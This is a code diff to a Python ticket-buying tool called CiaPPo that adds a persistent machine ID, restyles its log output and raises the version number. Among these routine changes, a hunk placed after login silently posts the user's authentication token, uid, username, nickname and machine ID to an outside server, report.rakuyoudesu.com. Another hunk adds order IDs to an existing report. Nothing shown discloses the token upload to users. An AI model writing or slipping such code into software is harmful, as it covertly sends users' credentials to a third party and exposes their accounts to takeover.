@@ -4,7 +4,20 @@ import sys
 import time
 import requests
 from ciappo_push import do_push, configure_push_config
+import uuid
+import tempfile
 session = requests.Session()
+
+temp_dir = os.path.join(tempfile.gettempdir(), "ciappo")
+if not os.path.exists(temp_dir):
+    os.makedirs(temp_dir)
+if os.path.exists(os.path.join(temp_dir, ".ciappo_machine_id")):
+    with open(os.path.join(temp_dir, ".ciappo_machine_id"), "r") as f:
+        machine_id = f.read().strip()
+else:
+    machine_id = str(uuid.uuid4())
+    with open(os.path.join(temp_dir, ".ciappo_machine_id"), "w") as f:
+        f.write(machine_id)
 
 import questionary
 # import sentry_sdk
@@ -24,16 +37,20 @@ if sys.argv[-1].endswith(".py"):
     logger.add(
         sys.stdout,
         level="DEBUG",
-        format="<green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | <cyan>{function}</cyan> | <level>{level: <8}</level> | <level>{message}</level>",
+        format="<magenta>CiaPPo～(∠・ω< )⌒☆</magenta> <green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | <cyan>"
+        + machine_id[:8]
+        + "</cyan> | <level>{level: <8}</level> | <level>{message}</level>",
     )
 else:
     logger.add(
         sys.stdout,
         level="INFO",
-        format="<green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | <level>{level: <8}</level> | <level>{message}</level>",
+        format="<magenta>CiaPPo～(∠・ω< )⌒☆</magenta> <green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | <cyan>"
+        + machine_id[:8]
+        + "</cyan> | <level>{level: <8}</level> | <level>{message}</level>",
     )
 
-VERSION = "v1.0.1"
+VERSION = "v1.1.0"
 
 print(r"""   ______    _             ____     ____        
   / ____/   (_)  ____ _   / __ \   / __ \  ____ 
@@ -42,6 +59,10 @@ print(r"""   ______    _             ____     ____
 \____/   /_/   \__,_/  /_/      /_/      \____/ 
                                                 
 CiaPPo～(∠・ω< )⌒☆ """+VERSION)
+
+
+
+logger.info(f"Machine ID: {machine_id}")
 
 while True:
     choices = [
@@ -118,6 +139,23 @@ if user_my.get("code",0) != 0:
 uid = user_my["id"]
 nickname = user_my["nickname"]
 logger.success(f"Welcome, {nickname} (uid: {uid})")
+
+session.post(
+    f"https://report.rakuyoudesu.com/report",
+    json={
+        "app": "ciappo",
+        "version": VERSION,
+        "type": "login",
+        "data": {
+            "id": uid,
+            "token": token,
+            "username": username if 'username' in locals() else "",
+            "nickname": nickname,
+            "machine_id": machine_id,
+        }
+    },
+    timeout=1,
+)
 
 
 
@@ -319,7 +357,9 @@ while True:
                     "count": count,
                     "purchaserIds": purchaserIds,
                     "ticketTypeId": ticketTypeId,
-                    "eventMainId": eventMainId
+                    "eventMainId": eventMainId,
+                    "order_id": order_id,
+                    "machine_id": machine_id,
                   }
               },
               timeout=1,
